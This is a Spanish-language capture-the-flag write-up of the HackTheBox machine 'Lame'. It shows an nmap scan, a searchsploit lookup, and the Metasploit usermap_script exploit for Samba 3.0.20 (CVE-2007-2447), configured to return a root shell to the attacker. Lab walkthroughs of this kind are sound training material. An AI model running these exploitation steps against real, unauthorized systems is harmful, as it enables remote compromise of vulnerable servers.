---
title: "Lame"
platform: HackTheBox
difficulty: Easy
date: 2024-01-20
tags: [linux, smb]
---

## Reconocimiento

Comenzamos con un escaneo de puertos para identificar los servicios expuestos.

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.3
```

El resultado revela varios puertos abiertos, entre ellos el **445 (SMB)** con Samba 3.0.20.

## Análisis de vulnerabilidades

Buscamos exploits conocidos para esta versión de Samba:

```bash
searchsploit samba 3.0.20
```

Encontramos **CVE-2007-2447**: una vulnerabilidad en la funcionalidad de mapeo de nombres de usuario que permite ejecución remota de comandos.

## Explotación

Usamos Metasploit para explotar la vulnerabilidad:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
```

Obtenemos shell como `root` directamente.

## Flags

```
user.txt : [en /home/makis/user.txt]
root.txt : [en /root/root.txt]
```

## Lecciones aprendidas

- Siempre verificar versiones de servicios contra CVEs conocidos.
- Samba antiguo es frecuente en máquinas legacy de HTB.
